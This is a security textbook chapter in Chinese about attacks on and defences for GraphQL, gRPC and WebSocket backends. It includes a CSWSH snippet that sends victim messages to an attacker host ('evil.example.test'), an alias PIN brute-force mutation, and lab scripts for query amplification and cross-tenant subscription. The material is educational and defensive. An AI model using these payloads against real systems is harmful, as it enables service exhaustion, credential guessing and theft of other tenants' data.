# 第 7 章：非 REST 現代後端協定安全（GraphQL、gRPC 與 WebSocket）

在傳統 REST API 的世界裡，後端工程師的防禦直覺幾乎都是綁在「一個 HTTP 方法配一條網址路徑」上的：API 閘道針對 `POST /v1/login` 設下每分鐘最多打 5 次的速率限制；權限守衛在 `/v1/tenants/:tid/accounts/:aid` 的路由入口核對租戶編號；WAF 則負責掃描 JSON 請求裡那一層扁平的欄位。

但當系統為了前端聚合查詢、微服務高速通訊與即時推播，陸續換上 **GraphQL**、**gRPC** 與 **WebSocket** 之後，「一個 HTTP 請求就等於一次資源操作」的前提瞬間瓦解了。

GraphQL 把所有讀寫全收進同一個 `POST /graphql` 端點，把「要查多深、要撈幾層關聯」的主導權交給前端；gRPC 把強型別的 Protobuf 二進位封包跑在 HTTP/2 長連線上；WebSocket 更是在開頭握完一次手（HTTP Upgrade）後就徹底脫離 HTTP 管線，變成雙向自由傳送訊框的長通道。如果安全防線還停在最外層的 HTTP 閘道，攻擊者只要鑽進協定內部結構，就能把防線輕鬆繞開。

---

## 從你已知的出發

為什麼 NexusPay 的 GraphQL 報表閘道明明已經照著資安建議，設了「查詢巢狀深度最多 `8` 層」以及「單次 HTTP Batch 最多 `20` 個操作」兩道限制，攻擊者卻還是只發了**單單一筆**完全合規的 HTTP POST 請求（深度只有 `6` 層、Batch 操作數只有 `1`），就讓後端瞬間爆出上萬筆節點查詢，直接把資料庫連線池塞爆？

因為我們很容易只盯著「外層的 HTTP 請求數」跟「查詢樹有幾層樓高（深度）」，卻忘了**查詢樹每一層往外張開的「分支度（Branching Factor）」與語法內建的「別名（Alias）複製能力」，本身就是由外部使用者控制的乘數**。利用一對多的業務關聯邊（商戶 → 帳戶 → 交易 → 對手方 → 發票），每層只撈 `4` 筆資料，走 5 層關聯就是 $4^5 = 1,024$ 倍展開，再在同一個查詢裡用 20 個 Alias 複製二十份，一筆 HTTP 請求當場就膨脹成兩萬多個結果節點！同樣的盲點也發生在授權與長連線上：以為外層驗過一次入口就安全了，卻放任內層的巢狀 Resolver、gRPC 未知欄位與 WebSocket 後續訊框在毫無檢查的狀態下裸奔。

---

## 機制與推導

### 攻擊者目標與實質影響

非 REST 協定的結構彈性，讓攻擊者有了三條能直接繞過傳統 HTTP 閘道與 WAF 的捷徑：

第一是**四兩撥千斤的資源耗盡（DoS）**。攻擊者不需要發動大流量 DDoS，只要送出精心構造的 GraphQL 巢狀關聯與 Alias 組合查詢，就能用極少量的外部請求，在後端放大出成千上萬倍的資料庫查詢，直接拖垮 NexusPay 的結算引擎。

第二是**鑽進關聯邊與長連線偷資料**。透過繞過頂層檢查直取內層的 GraphQL Resolver、或是發動跨站 WebSocket 劫持（CSWSH）與跨頻道訂閱，攻擊者可以偷看到未公開的商戶機密欄位，甚至即時攔截別家租戶的入帳推播。

第三則是**摸清內部底牌，串接下一波攻擊**。只要利用忘了關的 gRPC Server Reflection 或 GraphQL 的拼字錯誤提示（Field Suggestion），攻擊者就算沒有原始碼與文件，也能把後端隱藏的內部管理方法與資料模型摸得一清二楚，為接下來的資料庫注入（見第 8 章）與併發競態攻擊（見第 12 章）畫好精準地圖。

---

### GraphQL：單一端點背後的指數級放大與 Resolver 漏檢

NexusPay 為商戶後台提供了一支即時對帳報表端點 `POST /graphql`，讓前端能一次拉回商戶基本資料、名下帳戶、結算明細與發票。為了怕前端不小心寫出太肥的查詢拖垮資料庫，團隊在 GraphQL 伺服器上設了全書基準的兩道防線：**預設巢狀深度上限 `8` 層**，以及**單次 HTTP Batch 請求上限 `20` 個操作**。

為什麼設了這兩條規則，還是擋不住攻擊者？我們來拆解藏在 GraphQL 語法裡的三個大盲區：

#### 1. 關了 Introspection，卻忘了關「拼字錯誤提示（Field Suggestion）」

幾乎所有資安指南都會教你：「上線前一定要把 GraphQL 的 `__schema` 與 `__type` 內省查詢（Introspection）關掉，免得駭客一鍵下載整份 API 結構。」很多團隊照做了，卻沒注意到 `graphql-js` 或 Apollo Server 預設還貼心地開著另一個功能——**Field Suggestion**。

當攻擊者故意送出一個拼錯一半的欄位名稱：

```graphql
query { merchant { internal_not } }
```

伺服器雖然會拒絕執行，但噴出來的錯誤訊息卻直接出賣了底牌：
`"Cannot query field 'internal_not' on type 'Merchant'. Did you mean 'internal_notes' or 'internal_risk_score'?"`
攻擊者只要拿常見的商業字根字典跑一輪模糊探測，就算你把 Introspection 鎖得死死的，他還是能靠伺服器熱心的「你是不是想查…」提示，把所有沒寫進公開文件的隱藏欄位跟敏感 Mutation 一塊塊拼湊出來。

#### 2. 用 Alias 別名在單一請求裡撞破 Rate Limit

在 GraphQL 裡，**Alias**（別名）原本是為了讓前端在同一個查詢裡，用不同參數查同一個欄位而設計的語法。但這看在攻擊者眼裡，簡直是繞過速率限制的神器：

```graphql
mutation BruteForcePin {
  try1: verifySettlementPin(pin: "0001") { ok }
  try2: verifySettlementPin(pin: "0002") { ok }
  # ... 一口氣塞進 1,000 個 Alias ...
  try1000: verifySettlementPin(pin: "1000") { ok }
}
```

你想想看：最外層的 Nginx 或 API 閘道 Rate Limiter 看到的是什麼？它只看到**區區 1 個 `POST /graphql` HTTP 請求**！

而你設的「單次 HTTP Batch 請求上限 `20` 個操作」，管的是最外層 JSON 陣列 `[{ "query": "..." }, { "query": "..." }]` 有幾個元素，根本管不到單一 `query` 字串裡面塞了幾個 Alias。只要後端沒有在 `verifySettlementPin` 的 Resolver 裡面自己綁定錯誤計數器，也沒有算整份查詢的總成本，這 1 發 HTTP 請求進到後端，就會當場觸發 1,000 次密碼驗證！

#### 3. Worked Example：完全合規（深度 <= 8、Batch <= 20）卻放大兩萬倍的查詢樹

就算攻擊者不撞密碼，只想癱瘓你的系統，他連 `8` 層深度跟 `20` 筆 Batch 的邊界都不用踩線。只要 Schema 裡面有一對多展開的關聯邊（像是 `merchants → accounts → transactions → counterParties → recentInvoices`），把「分支展開」跟「Alias 乘數」乘在一起，威力就非常驚人。

我們直接拿 NexusPay 的基準設定算一遍這筆帳：

```text
條件設定（百分之百符合 NexusPay 的預設防線，完全不會觸發深度或批次阻斷）：
- 單次 HTTP Batch 操作數：1（<= 批次上限 20）；但在這 1 個 Operation 裡面塞了 20 個 Alias（批次上限根本不管 Alias）
- 查詢關聯巢狀深度：5 層關聯列表（就算加上最底層的純量欄位 id / amount 也才 6 層，完全 <= 深度上限 8 層）
- 每層關聯列表固定展開的筆數（Branching Factor）：b = 4
  （例如每層都帶參數 limit: 4，依序展開：4 家商戶 → 每家 4 個帳戶 → 每戶 4 筆交易 → 每筆 4 個對手方 → 每個對手方 4 張近期發票）

先算單一 Alias 子樹在每一層展開的「結果物件節點數」與「列表欄位 Resolver 呼叫次數」（假設每層剛好回傳 4 筆，且沒掛 DataLoader）：
- 第 1 層（merchants）：呼叫列表 Resolver 4^0 = 1 次 → 撈出 4^1 = 4 個商戶物件節點
- 第 2 層（accounts）：對 4 個商戶各呼叫一次，共 4^1 = 4 次 → 撈出 4^2 = 16 個帳戶物件節點
- 第 3 層（transactions）：對 16 個帳戶各呼叫一次，共 4^2 = 16 次 → 撈出 4^3 = 64 筆交易物件節點
- 第 4 層（counterParties）：對 64 筆交易各呼叫一次，共 4^3 = 64 次 → 撈出 4^4 = 256 個對手方物件節點
- 第 5 層（recentInvoices）：對 256 個對手方各呼叫一次，共 4^4 = 256 次 → 撈出 4^5 = 1,024 張發票物件節點

現在乘上同一個查詢裡的 20 個 Alias（q01 到 q20）：
1. 展開的結果物件節點總數（以及若實作採用「每個結果物件各自發 1 次依 ID 查詢」的逐項查詢模型）：
   - 光是第 5 層最底下的葉節點結果項數：20 × 4^5 = 20 × 1,024 = 20,480 個結果項
   - 整棵樹 5 層加總的結果項數：20 × (4 + 16 + 64 + 256 + 1,024) = 20 × 1,364 = 27,280 個結果項
2. 列表欄位 Resolver 總呼叫次數（每拿到一個父物件就呼叫一次子列表 Resolver，單一 Alias 就是 1 + 4 + 16 + 64 + 256 = 341 次）：
   - 光是第 5 層列表欄位 Resolver 求值數：20 × 256 = 5,120 次
   - 整棵樹 5 層列表欄位 Resolver 累計求值數：20 × 341 = 6,820 次

實質衝擊推算：
這筆 HTTP 請求明明只有 6 層深、Batch 為 1，100% 合法穿過閘道防線，
卻在伺服器內部瞬間炸出 20,480 個第 5 層結果項（全樹 27,280 個結果項），並觸發 5,120 次第 5 層列表求值（全樹 6,820 次列表求值）。
如果沒掛 DataLoader，按每次列表求值發一筆只要 2 ms 的超快 SQL 來算，光第 5 層就要花掉 10.24 s、全樹累計要跑 13.64 s 的資料庫查詢工作時間；
萬一寫法是對每個展開的結果物件節點都各自發一筆 2 ms 的逐項查詢，第 5 層更會飆到 40.96 s、全樹高達 54.56 s！
只要上游等待第一個回應位元組的時間超過外層 Nginx 的 proxy_read_timeout (30 s)，當場就會觸發閘道逾時，幾筆併發打進來就能把資料庫連線池徹底榨乾。
```

#### 4. 藏在巢狀關聯邊裡的 Resolver BOLA

除了把資料庫打趴，GraphQL 的樹狀結構也是第 6 章講的 **BOLA（越權存取）** 最愛躲藏的溫床。

在 REST API 裡，`/v1/tenants/:tid/accounts/:aid` 的權限檢查就寫在唯一的那支 Controller 入口。但在 GraphQL 裡，通往同一個 `Account` 物件的路可不只一條！工程師通常會記得在最頂層的入口 `Query.account(id)` 乖乖檢查 `currentUser.tenantId === account.tenantId`。

卻天真地以為，如果使用者是從一筆交易紀錄往下查 `Transaction.sourceAccount`、從發票查 `Invoice.merchant`、或從稽核日誌查 `AuditLog.actor`，既然上層的交易已經查出來了，底下的巢狀 Resolver 就不用再驗一次租戶了吧？

這就給了攻擊者橫向移動的機會：只要有一筆跨租戶交易或公開對帳單上留著指向別家商戶的關聯邊，而那個巢狀欄位的 Resolver 跟底層資料表又沒有強制帶上 `tenant_id` 過濾條件，攻擊者就能從自己合法擁有的一個節點出發，順著關聯邊一路摸進別家租戶的帳戶餘額與手續費設定裡。

---

### gRPC 與 Protobuf：以為是內網強型別二進位就不會出事？

再往 NexusPay 內部走，帳務核心微服務之間跑的是架在 HTTP/2 上的 **gRPC 與 Protobuf**。很多後端團隊對內部 gRPC 服務抱著兩個危險的迷思：一是覺得「這又不對外開放，都是自己人呼叫的」；二是覺得「Protobuf 是強型別的二進位格式，總不會像 JSON 那樣搞出型別混淆或解析漏洞吧？」

這兩個迷思，在下面這張 gRPC 請求穿過攔截器與解碼器的流程圖裡，會露出三個意想不到的破口：

```text
+-------------------------------------------------------------------+
|  Client / Compromised Edge Service                                |
|  -> HTTP/2 POST /nexuspay.ledger.v1.LedgerService/AdjustBalance   |
|  -> Header (Metadata): x-tenant-id: t_victim   (Unauthenticated?) |
+---------------------------------+---------------------------------+
                                  |
                                  v
+-------------------------------------------------------------------+
|  gRPC Server Interceptor Chain                                    |
|  1. Reflection Service enabled? -> Leaks service descriptors/RPCs |
|  2. Auth Interceptor skips specific method or trusts Metadata?    |
+---------------------------------+---------------------------------+
                                  |
                                  v
+-------------------------------------------------------------------+
|  Protobuf Wire Decoder (Field Key / Wire-Type Value & Varint)     |
|  - Unknown fields preserved / forwarded across proxies            |
|  - Zero-value omission: amount=0 / role=0 (ADMIN?) indistinguishable|
|  - int32 vs uint32 / sint32 ZigZag boundary across languages      |
+-------------------------------------------------------------------+
```

#### 1. 忘了關 gRPC Server Reflection，等於把整份 `.proto` 雙手奉上

為了在開發時方便用 `grpcurl` 或 Postman 測試，很多工程師會在啟動 gRPC 伺服器時順手掛上 `grpc.reflection.v1alpha.ServerReflection`（或 `v1`），然後就這樣一路帶上了正式環境。

一旦這支服務透過 Ingress、gRPC-Web 對外暴露，或攻擊者攻陷了內網邊緣的某個容器（見第 28 章），他手邊根本不需要有 `.proto` 原始檔。只要對 Reflection 服務發一筆查詢，就能把這台伺服器註冊的所有 Package、Service、RPC 方法名稱與 Request/Response 欄位型別全部列出來——包括像 `ForceSettle` 或 `DebugDumpState` 這種沒寫進外部文件的內部管理方法。

#### 2. 只鎖了 Unary 卻漏鎖 Stream，以及盲目相信 Metadata 標頭

在 gRPC 裡，JWT 或租戶編號（像 `authorization`、`x-tenant-id`）是放在 HTTP/2 的 Header（在 gRPC 叫做 **Metadata**）裡傳遞的，並靠伺服器端的 **Interceptor（攔截器）** 來把關。這裡最常踩到兩個大坑：

第一個坑是 **Unary 與 Streaming 攔截器是分開掛的**。很多開發者在 `unaryInterceptor` 裡寫了完整的 JWT 驗章與租戶比對，卻忘了 gRPC 還有一個 `streamInterceptor`！如果串流方法裡面沒自己驗權限、上游閘道也沒擋，所有走雙向或伺服器端串流的即時對帳流，就會直接無驗證暴露。

第二個坑是**無條件相信上游傳來的 Metadata**。常見架構是：外層 API 閘道驗完 JWT 後，把 `x-user-id` 跟 `x-role` 塞進 gRPC Metadata 轉發給內部帳務服務。

如果內部 gRPC 服務沒用 mTLS 確認呼叫方身分，或者閘道在轉發時**沒有先把外部客戶端自己偷塞的同名 `x-user-id`、`x-role` 標頭洗掉（Strip / Overwrite）**，攻擊者只要在外部請求裡自己帶一行 `x-role: platform_admin`（或搭配第 3 章的 HTTP/2 標頭走私），就能直接騙過內部微服務。

#### 3. Protobuf 二進位編碼的三個暗礁：預設零值、未知欄位透傳與大整數失真

就算攔截器寫對了，Protobuf（特別是 Proto3）本身的二進位線路格式還有三個極容易害死商業邏輯的特性：

先看**預設零值陷阱（Proto3 Default Value Ambiguity）**。假設某個工程師在定義角色列舉時，順手把最高權限的 `ADMIN` 放在第一個（編號 `0`）：

```protobuf
// 危險的 Proto3 Enum 定義：把高權限放在預設零值 0！
enum Role {
  ADMIN = 0;
  MERCHANT = 1;
}
```

在 Proto3 裡，所有沒特別標註 `optional` 的純量欄位都採用「隱式存在語意（Implicit Presence）」——只要欄位值等於預設零值（整數 `0`、布林 `false`、Enum `0`），序列化到網路上時就不傳；反過來，接收端只要發現封包裡沒傳 `role` 欄位，讀出來的預設值就是 `0`！

這意味著，如果後端直接拿解碼出來的 `req.role` 去賦予權限，攻擊者只要送出一個**完全不填 `role` 欄位**的空訊息，伺服器讀出來的竟然就是 `Role.ADMIN`（`0`）！同理，在部分更新（Patch）的 API 裡，如果金額或費率欄位沒加上 `optional` 來明確區分「未提供」與「明確傳了 `0`」，就很容易把商戶原有的設定誤清成 `0`。

再看**未知欄位（Unknown Fields）的幽靈透傳**。當邊緣檢查代理用的是舊版 `v1.proto`（只認識欄位 `1` 到 `5`），而後面的核心帳務服務已升級到新版 `v2.proto`（新增了欄位 `6: bool bypass_risk_check`）時會怎樣？

在支援保留未知欄位的 Protobuf 執行環境裡，舊版代理收到不認識的欄位 `6` 時會默默留在未知欄位區；等代理檢查完欄位 `1` 到 `5` 合法、把同一個訊息物件重新序列化轉發給後端時，**欄位 `6` 就跟著原封不動被帶進了核心服務**！只要下游核心服務沒自己重驗權限，攻擊者就能把危險欄位偷渡進去。

最後是**跨語言的 Varint 與 64 位元整數精度落差**。在 Protobuf 底層，負的 `int32` 與 `int64` 是用二補數（Two's Complement）編碼的（負 `int32` 在線路上會先符號延伸為 64 位元，固定佔 10 bytes 的 varint），只有 `sint32` / `sint64` 才走 ZigZag 編碼。若跨服務 `.proto` 型別定義不一致（如 `uint32` vs `int32`）或把 `int64` 窄化轉型為 32 位元有號整數，大整數瞬間就會變成負數。

更常見的是當 Go 或 Rust 微服務用 `int64` 傳遞超大筆金額給 Node.js 閘道時：JavaScript 原生的 `Number` 是 IEEE 754 雙精度浮點數，超過 `Number.MAX_SAFE_INTEGER`（$2^{53}-1$，53-bit 有效精度）就會開始吃掉尾數！如果 Node.js 解碼時沒有強制指定轉成 `BigInt` 或 `string`，兩邊算出來的金額就會出現尾數差，讓限額或簽章核對出現破口。

---

### WebSocket：握一次手就不管了？小心 CSWSH 與長連線權限僵化

最後來看 NexusPay 負責對商戶瀏覽器推播即時入帳通知的 **WebSocket**（RFC 6455）閘道。很多工程師對 WebSocket 的資安防護只有一句話：「WebSocket 一開始握手（HTTP Upgrade）走的不就是同一條 Express/NestJS 路由嗎？既然瀏覽器有把 Session Cookie 帶上來、也驗過登入了，後面還有什麼好擔心的？」

這句話直接踩中了 WebSocket 生命週期的兩個大雷區：

#### 1. 跨站 WebSocket 劫持（Cross-Site WebSocket Hijacking，CSWSH）

想像一下，受害商戶剛登入完 NexusPay 後台，分頁還沒關，接著在同一個瀏覽器點開了駭客架設的釣魚網站 `https://evil.example.test`。駭客的網頁裡只寫了短短三行 JavaScript：

```javascript
const ws = new WebSocket("wss://api.nexuspay.test/ws/notifications");
ws.onmessage = (event) => fetch("https://evil.example.test/steal?data=" + encodeURIComponent(event.data));
```

當瀏覽器發起 `new WebSocket(...)` 握手時，只要 NexusPay 的 Session Cookie 符合傳送條件（例如跨站握手設了 `SameSite=None; Secure`，或同站跨子網域握手連 `SameSite=Lax` / `Strict` 的共用 Cookie 也會附上——瀏覽器 SOP、CORS 與 SameSite 的精確邊界將於第 10 章深入拆解），**瀏覽器就會自動把受害者的登入 Cookie 貼上去**！

最要命的是：一般 `fetch` 或 `XHR` 跨站請求會被瀏覽器的 CORS 政策擋下來；**但 CORS 根本不管 WebSocket 的 `101 Switching Protocols` 握手！** 只要後端在握手時只看 Cookie 對不對，卻沒嚴格檢查 `Origin` 標頭是不是自家合法網域，這條雙向長連線就會當場建立成功，讓駭客網頁即時偷聽所有入帳通知，甚至代發操作指令。

#### 2. 握手之後的訊息層 BOLA 與長連線權限僵化（Stale Auth）

就算握手階段真的只放了合法的使用者進來，一旦 TCP 連線完成 `Upgrade` 切換成 WebSocket 訊框（Frame）模式，後面來來往往的 JSON 訊框就再也不會經過你寫的 Express Middleware、CSRF Token 檢查或 NestJS HTTP Guard 了。這在實務上常捅出兩個大洞：

第一個是**訂閱頻道時忘了二次驗權限（訊息層 BOLA）**。握手時後端確實確認了「你是租戶 `t_0001` 的合法員工」；但等連線建好，客戶端送來一筆訂閱訊框：

```json
{"action": "subscribe", "channel": "tenant:t_0002:ledger"}
```

如果訊息處理器沒有拿握手時綁定的 `session.tenantId`（`t_0001`）去核對他想訂的頻道，而是直接把前端傳來的 `channel` 字串丟給 Redis Pub/Sub，那任何一個普通商戶只要改個字串，就能偷聽全平台所有其他商戶的即時帳務流水。

第二個則是**長連線的權限僵化（Stale Auth）**。別忘了 NexusPay 的 RS256 JWT 有效期只有 `900 s`（15 分鐘），而且管理員隨時可能在後台把某個離職員工停權。如果服務只在握手那一秒檢查過一次憑證，後面只要 TCP 長連線沒斷開，就算 JWT 早就過期或員工已被停權，這條活著的 WebSocket 連線依然保有握手當下的舊權限，繼續源源不絕地接收公司機密帳務推播。

---

## 故障模式與防禦

看穿這三種非 REST 協定的破口後，我們的防禦原則其實非常一致：**絕對不能只守在最外層的 HTTP 或連線入口，必須把成本計算與權限核對，一路下推到協定內部每一次展開的節點、每一個二進位欄位與每一幀長連線訊框上。**

### 防禦 1：替 GraphQL 裝上執行前成本分析、靜態查詢白名單與 Resolver 強制租戶綁定

既然單靠「深度 `8` 層」與「Batch `20` 筆」擋不住 Alias 乘上分支度的指數放大，工程上就得靠三層組合拳來鎖死：

| 防禦層級 | 具體怎麼做 | 能擋下哪種攻擊 |
|---|---|---|
| **執行前靜態成本計算**（Query Cost Analysis） | 在真正呼叫任何一個 Resolver 之前，先靜態掃描一遍查詢 AST：把每個欄位的基礎權重乘上列表的 `limit / first` 參數，整棵樹連同所有 Alias 一併累加總分；只要總分超過上限（例如 `500` 或 `1,000` 點），一筆 SQL 都別發，當場回傳錯誤拒絕。 | 合法深度與批次限制內的指數級查詢放大（像前面算過單一請求展開 `20 × 4^5 = 20,480` 個第 5 層結果項／`6,820` 次列表求值）與循環關聯 DoS。 |
| **靜態查詢白名單**（Persisted Queries / Trusted Documents） | 正式環境直接禁止前端送任意拼湊的 GraphQL 查詢字串！前端在打包建置（Build time）時，先把所有合法的查詢註冊成雜湊編號（`queryId`）存進伺服器白名單；線上執行時只准傳 `queryId` 跟變數。 | 徹底廢掉未知欄位刺探、Field Suggestion 字典枚舉，以及塞幾百個 Alias 的暴力撞碼。 |
| **欄位級 Context 注入與資料層雙重把關** | 每個 Resolver（包含最深層的巢狀關聯 Resolver）都必須從不可竄改的 `ctx.auth` 讀取 `tenantId` 與角色，並把租戶條件硬性帶進底層 SQL（搭配第 6 章的 PostgreSQL RLS）。 | 順著 `Transaction → Account` 或 `Invoice → Merchant` 等關聯邊繞過頂層檢查的 Resolver BOLA。 |

除此之外，如果這是內部後台專用的 GraphQL API，上線時記得同時關掉 Introspection **與** Field Suggestion 拼字提示；而像登入、驗證交易 PIN 碼這類敏感的 Mutation，速率限制的計數器一定要寫進該 Resolver 函式的肚子裡（算實際被呼叫了幾次），絕對不能只算外層有幾個 HTTP 請求。

### 防禦 2：關掉線上 gRPC Reflection、統一雙攔截器並消滅 Proto3 零值歧義

針對內部 gRPC 微服務，加固的重點有三個：

第一，**用環境變數隔離 Server Reflection**。只在本地開發與測試環境註冊 Reflection 服務；正式環境的建置腳本與對外暴露的 gRPC 閘道一律拔掉 Reflection 路由，不給攻擊者免費的 API 地圖。

第二，**把驗證邏輯同時掛上 Unary 與 Stream 攔截器，並洗掉外部偽造標頭**。寫認證模組時，一定要同時實作 `UnaryServerInterceptor` 與 `StreamServerInterceptor`，確保串流介面不會漏網。微服務之間透過 mTLS（如 SPIFFE 憑證）確認呼叫方身分；而最外層閘道在轉發前，必須**先剝除（Strip）或強制覆寫**所有像 `x-tenant-id`、`x-user-id`、`x-role` 這類敏感 Metadata。

第三，**立下嚴格的 `.proto` 撰寫規矩**。定義任何 `enum` 時，編號 `0` 一律留給 `ROLE_UNSPECIFIED` 並在程式裡收到 `0` 就報錯拒絕，嚴禁把 `ADMIN` 設在 `0`；敏感或局部更新欄位一律加上 `optional` 顯式追蹤欄位是否存在；邊界代理則開啟丟棄未知欄位或重建乾淨訊息的嚴格模式，防止跨版本 `.proto` 偷渡隱藏欄位。

### 防禦 3：WebSocket 握手強制驗 Origin + 一次性 Ticket，連線中逐訊框驗權限

要守住 WebSocket 長連線，必須把「握手那一下」跟「連線後的每一秒」分開加固：

在**握手階段（防 CSWSH）**，千萬別只靠 Cookie 就放行。首先，伺服器收到 HTTP Upgrade 時必須嚴格檢查 `Origin` 標頭：先確認它是格式合法的單一來源值，再把完整的 `scheme://host[:port]` 拿去跟白名單做精確比對（不可用 `startsWith` 或子字串包含）。

更乾脆的做法是導入**一次性短效 Ticket 機制**：前端想連 WebSocket 前，先帶 Bearer JWT 打一支受標準 CORS 保護的 REST API `POST /v1/ws-ticket`，拿一張存於 Redis、綁定該會話與租戶的隨機 Ticket（TTL `30 s`，且以原子操作單次消費即刪）；握手階段強制驗證這張 Ticket 而不再單憑 Cookie 放行，徹底切斷跨站劫持路徑。

在**連線建立之後（防訊息層 BOLA 與權限僵化）**，每收到一幀 `subscribe` 或操作訊框，都必須拿連線上綁定的 `ws.tenantId` 與最新角色權限去核對目標資源，嚴禁相信訊框裡自填的 `tenantId`。同時在 Redis Pub/Sub 建立控制頻道（如 `auth:revoke:<userId>`）並搭配伺服器端連線有效期限檢查（如對齊 JWT `900 s` 到期重驗）；一旦使用者登出、被降權或憑證逾期，立即停止推播並由伺服器主動送出 Close Frame（如 `4001 Unauthorized`）切斷連線。

---

## 動手做

- **難度**：進階
- **預估時間**：45 分鐘

這節我們在本地 Docker Compose 的 NexusPay 靶機上，親手打穿並修補 GraphQL 報表閘道與 WebSocket 即時通知服務，最後再到 PortSwigger 線上靶場對照練習。

### 任務一：用 GraphQL Alias 乘上 5 層關聯打穿防線，再掛上成本估算器擋下它

1. 先看一眼本地靶機的 GraphQL 端點 `http://localhost:3000/graphql`，它目前已經設好了「最大深度 `8` 層」與「單次 HTTP Batch 上限 `20` 個操作」。
2. 寫一支 Python 腳本，只發送**單單 1 筆 HTTP POST 請求**（非 JSON Array Batch），在同一個 `query` 內塞 `20` 個 Alias（`q01` 至 `q20`），每個 Alias 向下查 `5` 層一對多關聯列表：`merchants(limit: 4) { accounts(limit: 4) { transactions(limit: 4) { counterParties(limit: 4) { recentInvoices(limit: 4) { id amount } } } } }`（含底層純量共 `6` 層，未超過 `8` 層上限），記錄回應時間與資料庫查詢數。
3. 接著在同一個腳本裡，對驗證提領 PIN 碼的 `verifySettlementPin(pin: "...")` Mutation 一口氣塞 `20` 個 Alias，看看能不能在一筆請求裡直接繞過 HTTP 閘道每分鐘限打 5 次的 Rate Limit。
4. 動手修補 GraphQL 伺服器：掛上 `graphql-query-complexity`（設每個列表節點基礎權重為 `1` 並依 `limit` 遞迴相乘：單一 Alias 成本為 $4 + 16 + 64 + 256 + 1,024 = 1,364 > 500$，20 個 Alias 總成本達 $27,280$），將最大允許查詢成本設為 `500`；同時把 PIN 驗證的限流計數器（同一主體每分鐘上限 5 次，從 0 起算於每次驗證前遞增檢查）搬進 Mutation Resolver 內部，重跑步驟 2 與 3 確認皆被攔下。

### 任務二：實測 WebSocket 跨站劫持（CSWSH）與跨租戶偷聽，再補上 Origin 與頻道檢查

1. 用 `wscat` 或 Python `websockets` 套件，帶入租戶 `t_0001` 的登入 Cookie，並刻意偽造 `Origin: https://evil.example.test` 連往 `ws://localhost:3000/ws/notifications`，觀察是否仍收到 `101 Switching Protocols`。
2. 連上之後，直接送出一幀跨租戶訂閱訊框 `{"action": "subscribe", "channel": "tenant:t_0002:ledger"}`，看看你拿著 `t_0001` 的身分能不能偷訂到別家租戶 `t_0002` 的即時帳本流水。
3. 動手修補 WebSocket 閘道：在握手階段加上嚴格的 `Origin` 白名單比對、實作單次核銷的 `POST /v1/ws-ticket`（存 Redis、`TTL = 30 s`），並在收到 `subscribe` 訊框時強制核對連線綁定的 `session.tenantId` 是不是跟頻道前綴一致，改完再跑一次測試確認漏洞封死。

### 外部靶場對照檢查點（PortSwigger Web Security Academy）

本地實驗過關後，推薦到 PortSwigger Web Security Academy 把下面兩個主題的實驗打通：

- **GraphQL API vulnerabilities**：
  - *Accessing private GraphQL posts* 與 *Find the hidden GraphQL endpoint*：親手體驗一下怎麼靠 Introspection 與 Field Suggestion 拼字提示挖出隱藏欄位。
  - *Bypassing GraphQL brute force protections*：實際用 Alias Batching 在單一 HTTP 請求裡塞滿密碼猜測，一舉突破外層的請求次數限流。
- **WebSockets**：
  - *Cross-site WebSocket hijacking*：看看當 WebSocket 握手只認 Cookie、既不驗 `Origin` 也沒用一次性 Ticket 時，駭客怎麼在第三方網頁裡直接把受害者的私密對話紀錄整包偷走。

---

### 參考解答

#### 任務一：GraphQL 放大攻擊驗證腳本與修補結果

```python
import time
import requests

URL = "http://localhost:3000/graphql"
HEADERS = {"Content-Type": "application/json", "Authorization": "Bearer <TOKEN>"}

# 構造 20 個 Alias × 5 層關聯列表（每層 limit: 4，含最底層純量欄位共 6 層 <= 上限 8 層）
aliases = []
for i in range(1, 21):
    aliases.append(f"""
    q{i:02d}: merchants(limit: 4) {{
      accounts(limit: 4) {{
        transactions(limit: 4) {{
          counterParties(limit: 4) {{
            recentInvoices(limit: 4) {{
              id
              amount
            }}
          }}
        }}
      }}
    }}""")

payload = {"query": "query CostAmp {\n" + "\n".join(aliases) + "\n}"}

t0 = time.perf_counter()
resp = requests.post(URL, json=payload, headers=HEADERS, timeout=30)
elapsed = time.perf_counter() - t0
print(f"HTTP {resp.status_code}, elapsed={elapsed:.3f}s")
```

在**修補前**跑這支腳本，伺服器會回傳 `200 OK`，但你會看到回應時間明顯暴增，後端資料庫瞬間被幾千筆關聯查詢洗版；而用 `20` 個 Alias 去打 `verifySettlementPin` 時，20 次猜測全部都會進到 Resolver 裡執行，外層的 HTTP 閘道完全不會跳出 `429 Too Many Requests`。

在**修補後**，當 GraphQL 引擎剛把查詢解析成 AST、還沒踏進任何業務 Resolver 前，成本估算器就會算出單一 Alias 成本（`1,364`）與整筆操作總成本（`27,280`）均超過上限 `500`，直接回傳 `"Query cost exceeds maximum allowed complexity of 500"`，資料庫查詢數為 `0`。而在 PIN 碼驗證那邊，因計數器已綁進 Resolver 內部（同一主體從 `0` 起算、每分鐘上限 `5` 次），跑到第 6 個 Alias 前就會直接被拒。

#### 任務二：WebSocket CSWSH 與跨租戶訂閱驗證腳本

```python
import asyncio
import json
import websockets

async def test_cswsh_and_bola():
    uri = "ws://localhost:3000/ws/notifications"
    # 測試伺服器會不會放行非白名單的惡意 Origin 握手，以及連上後能不能跨租戶偷訂別人的頻道
    headers = {
        "Cookie": "nexus_session=<SESSION_OF_T0001>",
        "Origin": "https://evil.example.test",
    }
    try:
        ws = await websockets.connect(uri, additional_headers=headers)
    except Exception as exc:
        print("[+] Handshake rejected as expected:", exc)
        return

    async with ws:
        print("[!] Upgrade accepted with untrusted Origin (server lacks Origin check; CSWSH exploitable when browser attaches session cookies)")
        try:
            await ws.send(json.dumps({
                "action": "subscribe",
                "channel": "tenant:t_0002:ledger",
            }))
            reply = await asyncio.wait_for(ws.recv(), timeout=3.0)
            print("[!] Subscription reply:", reply)
        except Exception as exc:
            print("[*] Post-handshake message failed or timed out:", exc)

asyncio.run(test_cswsh_and_bola())
```

在寫修補程式碼時，有兩個細節千萬別踩雷：
第一，檢查 `Origin` 時，一定要先用 `new URL(origin).origin === origin` 確認它真的是乾淨的單一來源格式，再去跟白名單 `ALLOWED_ORIGINS.has(origin)` 做精確比對，只要沒帶 `Origin` 或不在白名單內就一律拒簽握手。
第二，在處理 `subscribe` 訊框時，只能拿握手階段存進連線上下文的可信 `ws.tenantId`，硬性規定這條連線只能訂閱 `tenant:${ws.tenantId}:*` 開頭的頻道，把所有企圖跨租戶偷聽的請求當場踢掉。

---

## 自我檢核

- **難度**：入門至進階
- **預估時間**：15 分鐘

先別看下面的解答，試著用本章學到的協定內部視角，回答這三個問題：

